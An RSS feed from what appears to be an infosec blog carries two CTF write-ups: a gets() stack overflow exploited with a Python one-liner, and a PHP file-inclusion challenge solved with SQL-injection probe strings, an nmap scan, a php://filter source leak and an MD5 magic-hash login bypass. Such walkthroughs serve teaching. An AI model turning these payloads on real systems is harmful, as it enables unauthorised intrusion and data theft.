@@ -1,0 +1,238 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>kma on Yet, another infosec blog</title>
+    <link>/tags/kma/</link>
+    <description>Recent content in kma on Yet, another infosec blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 28 Mar 2021 09:30:00 +1345</lastBuildDate><atom:link href="/tags/kma/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>KCSC: A simple BOF</title>
+      <link>/posts/ez-bof/</link>
+      <pubDate>Sun, 28 Mar 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/ez-bof/</guid>
+      <description>&lt;p&gt;Today we are going to test out Ghidra with one of my university pwnie challenge.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Today we are going to test out Ghidra with one of my university pwnie challenge.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Info&lt;/th&gt;
+&lt;th&gt;Value&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Name&lt;/td&gt;
+&lt;td&gt;pwn1&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Type&lt;/td&gt;
+&lt;td&gt;ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Entropy&lt;/td&gt;
+&lt;td&gt;3.82492 (not packed)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;analyzing&#34;&gt;Analyzing&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s load the binary into our disassembler Ghidra and analyze the main function. Take your time to spot the problem in the following code.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;undefined4 &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+
+{
+  __uid_t __euid;
+  __uid_t __ruid;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; local_4c [&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;];
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; local_24;
+  undefined &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;local_14;
+  
+  local_14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;stack0x00000004;
+  local_24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+  setbuf(stdout,(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;);
+  setbuf(stdin,(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;);
+  setbuf(stderr,(&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;);
+  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;This should be an easy BOF!&amp;#34;&lt;/span&gt;);
+  gets(local_4c);
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (local_24 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;try again ma boi :v&amp;#34;&lt;/span&gt;);
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Good, now try harder&amp;#34;&lt;/span&gt;);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (local_24 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbabebeef&lt;/span&gt;) {
+      __euid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; geteuid();
+      __ruid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; geteuid();
+      setreuid(__ruid,__euid);
+      puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OK, submit the flag&amp;#34;&lt;/span&gt;);
+      system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cat flag&amp;#34;&lt;/span&gt;);
+    }
+  }
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;breakdown&#34;&gt;Breakdown&lt;/h2&gt;
+&lt;p&gt;We can see the variable &lt;code&gt;local_24&lt;/code&gt; is declared but never changed and thus the program&amp;rsquo;s flow will always result into &lt;code&gt;if (local_24 == 0)&lt;/code&gt; statement, &lt;em&gt;right?&lt;/em&gt; That&amp;rsquo;s when the buffer overflow jumps in as the &lt;code&gt;gets&lt;/code&gt; is marked as deprecated and not safe to use.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;MSDN:&lt;/p&gt;
+&lt;p&gt;Because there is no way to limit the number of characters read by gets, untrusted input can easily cause buffer overruns. Use &lt;code&gt;fgets&lt;/code&gt; instead.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;As the explanation is said, that it&amp;rsquo;s impossible to tell how many characters &lt;code&gt;gets&lt;/code&gt; will read into the buffer, here is &lt;code&gt;local_4c&lt;/code&gt; with the length of 40 in character. Let&amp;rsquo;s try overflow it with a simple python script.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/CTF/KCSC/ez_bof&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;print(&amp;#39;a&amp;#39;*41)&amp;#34;&lt;/span&gt; | ./pwn1
+This should be an easy BOF!
+Good, now try harder
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Great, we are able to get through the first block. In the next conditional statement, we can achieve the flag whether the comparison between &lt;code&gt;local_24&lt;/code&gt; and &lt;code&gt;0xbabebeef&lt;/code&gt; is equal. We can just simply modify the &lt;code&gt;local_24&lt;/code&gt; value to &lt;code&gt;0xbabebeef&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;As we have known that the buffer is holding 40 characters in size, the leftover ones are being passed onto the next stack address which is now &lt;code&gt;local_24&lt;/code&gt;&amp;rsquo;s address. So we will fill the buffer &lt;code&gt;local_4c&lt;/code&gt; with 40 characters and then put &lt;code&gt;0xbabebeef&lt;/code&gt; value into &lt;code&gt;local_24&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/CTF/KCSC/ez_bof&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;print(&amp;#39;a&amp;#39;*40 + &amp;#39;\xef\xbe\xbe\xba&amp;#39;)&amp;#34;&lt;/span&gt; | ./pwn1
+This should be an easy BOF!
+Good, now try harder
+OK, submit the flag
+KCSC&lt;span style=&#34;color:#f92672&#34;&gt;{[&lt;/span&gt;REDACTED&lt;span style=&#34;color:#f92672&#34;&gt;]}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+    <item>
+      <title>KCSC: LFI/RFI Wrapper</title>
+      <link>/posts/rfi-wrapper/</link>
+      <pubDate>Wed, 24 Feb 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/rfi-wrapper/</guid>
+      <description>This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university&amp;rsquo;s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.
+Fingerprinting Manual testing The absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes.</description>
+      <content>&lt;p&gt;This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university&amp;rsquo;s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.&lt;/p&gt;
+&lt;h2 id=&#34;fingerprinting&#34;&gt;Fingerprinting&lt;/h2&gt;
+&lt;h3 id=&#34;manual-testing&#34;&gt;Manual testing&lt;/h3&gt;
+&lt;p&gt;The absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes. Just for a few minutes, get a feeling of mechanics and how the website might operate. Looking at various functionality is the key to do web-pentest.&lt;/p&gt;
+&lt;p&gt;The login page is shown as we follow our given URL, which is &lt;code&gt;http://p2n.000webhostapp.com/log_me_in/index.php?page=login&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/1.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Pretty much simple. Let&amp;rsquo;s try some universal input into those fields and see what the return is.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username: admin
+password: admin
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/3.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The result is expected, a single text line informing invalid credentials. Next we will put a quote (&lt;code&gt;&#39;&lt;/code&gt;) into one of the field to check whether or not adhere to malformed input.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username: &#39;
+password: admin
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But it still returns the same error line so we can assume that the form is somewhat safe from common bypassing technique.&lt;/p&gt;
+&lt;p&gt;It also worth mentioning that you should try different types of input such as:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin&#39; --
+admin&#39; #
+admin&#39;/*
+admin&#39; or &#39;1&#39;=&#39;1
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;automation-testing&#34;&gt;Automation testing&lt;/h3&gt;
+&lt;h4 id=&#34;host-information&#34;&gt;Host information&lt;/h4&gt;
+&lt;p&gt;Next step is to enumerate the server type and ports. We all know in our current challenge that this step is insignificant but we can never know for sure, especially while dealing with real-life situations as this will help you determine which attack method to use, where and when to put the payload, etc.&lt;/p&gt;
+&lt;p&gt;So let us fire up our favorite tool of all time in automated enumeration, nmap.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -v -A --os-guess p2n.000webhostapp.com
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Basically, above command will provide us with how many ports are currently open and what type of OS the server is using.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;...
+
+PORT      STATE    SERVICE
+22/tcp    filtered ssh
+80/tcp    open     http
+443/tcp   open     https
+873/tcp   filtered rsync
+2020/tcp  filtered xinupageserver
+2049/tcp  open     nfs
+8080/tcp  open     http-proxy
+9100/tcp  filtered jetdirect
+9101/tcp  filtered jetdirect
+32768/tcp open     filenet-tms
+
+...
+Device type: general purpose|storage-misc|WAP
+Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (89%), HP embedded (87%), OpenBSD 4.X (86%), FreeBSD 12.X|11.X (86%)
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:openbsd:openbsd:4.3 cpe:/o:freebsd:freebsd:12.0 cpe:/o:freebsd:freebsd:11.1 cpe:/o:linux:linux_kernel:2.4
+Aggressive OS guesses: Linux 3.10 - 4.11 (89%), Linux 4.10 (89%), Linux 4.4 (89%), Linux 3.13 or 4.2 (88%), HP P2000 G3 NAS device (87%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (86%), OpenBSD 4.3 (86%), FreeBSD 12.0-RELEASE (86%), Linux 3.18 (86%), Linux 3.16 (85%)
+No exact OS matches for host (test conditions non-ideal).
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now we can see that the server is running on Linux-based OS. Using this we can keep going on enumerating those service ports but I will just put it here as we will discuss more about probing in our later posts.&lt;/p&gt;
+&lt;h2 id=&#34;in-depth-analysis&#34;&gt;In-depth analysis&lt;/h2&gt;
+&lt;p&gt;Now we want to pay a close attention to the given URL&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://p2n.000webhostapp.com/log_me_in/index.php?page=login
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The variable &lt;code&gt;page&lt;/code&gt; here looks pretty suspicious since its role is to act as a navigation controller. What to do here is to try assigning some value for &lt;code&gt;page&lt;/code&gt;.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://p2n.000webhostapp.com/log_me_in/index.php?page=abc
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/5.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Of course, it would be like this. The web server takes the &lt;code&gt;abc&lt;/code&gt; value and then adds the &lt;code&gt;.php&lt;/code&gt; extension after it.&lt;/p&gt;
+&lt;p&gt;This is the result of &lt;code&gt;page=flag&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/4.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After all, we are able to know that the endpoint has access to following objects:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;index.php
+login.php
+flag.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we come to the conclusion about this endpoint is simply  a LFI/RFI gold-mine for us to abuse as the value of &lt;code&gt;page&lt;/code&gt; is not being sanitized at all.&lt;/p&gt;
+&lt;p&gt;In case you are not aware of LFI/RFI, you can &lt;a href=&#34;https://en.wikipedia.org/wiki/File_inclusion_vulnerability&#34;&gt;read about it here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Since the webpage standard is not to include PHP objects as plain code, we have to wrap it up using any encoding types (base64). So our final payload would be as follow:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://p2n.000webhostapp.com/log_me_in/index.php?page=php://filter/convert.base64-encode/resource=index.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using Burp Suite to prettify the output:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/6.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Decode the base64 buffer will let us have the PHP source of &lt;code&gt;index.php&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;])) {
+	$page &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;];
+	
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/flag/i&amp;#34;&lt;/span&gt;, $page))
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;h1&amp;gt;Not so ez =))). Let&amp;#39;s think another way!!! &amp;lt;/h1&amp;gt;&amp;#34;&lt;/span&gt;);
+
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;page&amp;#39;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.php&amp;#39;&lt;/span&gt;);
+}
+&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+	&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: ?page=login&amp;#39;&lt;/span&gt;);
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Do the same with &lt;code&gt;login.php&lt;/code&gt; and grab the source&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;);
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;usr&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwd&amp;#39;&lt;/span&gt;]) ) {
+	$your_username &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;usr&amp;#39;&lt;/span&gt;];
+	$your_password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pwd&amp;#39;&lt;/span&gt;];
+
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($your_username &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;($your_password) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NOOPCJF&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $your_password &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NOOPCJF&amp;#34;&lt;/span&gt; )
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello admin!! Here your flag: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$flag;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Something went wrong!!!&amp;#34;&lt;/span&gt;);
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;head&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	&amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	&amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	&amp;lt;title&amp;gt;Login page&amp;lt;/title&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/head&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;body&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	&amp;lt;h1&amp;gt;Login form&amp;lt;/h1&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	&amp;lt;form action=&amp;#34;?page=login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;		&amp;lt;label for=&amp;#34;usr&amp;#34;&amp;gt; Username &amp;lt;/label&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;		&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;usr&amp;#34; required /&amp;gt; &amp;lt;br&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;		&amp;lt;label for=&amp;#34;pwd&amp;#34;&amp;gt; Password &amp;lt;/label&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;		&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;pwd&amp;#34; required /&amp;gt; &amp;lt;br&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;		&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;submit&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;	&amp;lt;/form&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/body&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we want to look at the IF statement as it provides us the valid credentials to achieve our flag&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($your_username &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;($your_password) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NOOPCJF&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $your_password &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NOOPCJF&amp;#34;&lt;/span&gt; )
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello admin!! Here your flag: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$flag;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+		&lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Something went wrong!!!&amp;#34;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The username is clearly &lt;code&gt;admin&lt;/code&gt; but the password part is a little tricky as it might seems the correct one is &lt;code&gt;NOOPCJF&lt;/code&gt; but the following statement is telling otherwise.&lt;/p&gt;
+&lt;p&gt;But there is a significant vulnerability here as the comparison between two hashes is using loose &lt;code&gt;==&lt;/code&gt; operator.&lt;/p&gt;
+&lt;p&gt;The MD5 hash of &lt;code&gt;NOOPCJF&lt;/code&gt; is &lt;code&gt;0e818888003657176127862245791911&lt;/code&gt;. This is not actually a valid MD5 since it starts with &lt;code&gt;\x0e&lt;/code&gt; and with the loose comparison operator, it will result in 0. So all you have to do is to find a MD5 string that also starts with &lt;code&gt;\x0e&lt;/code&gt;. In this case, we will use &lt;code&gt;240610708&lt;/code&gt; (&lt;code&gt;0e462097431906509019562988736854&lt;/code&gt;) as our password.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Username: admin
+Password: 240610708
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/7.png?raw=true&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
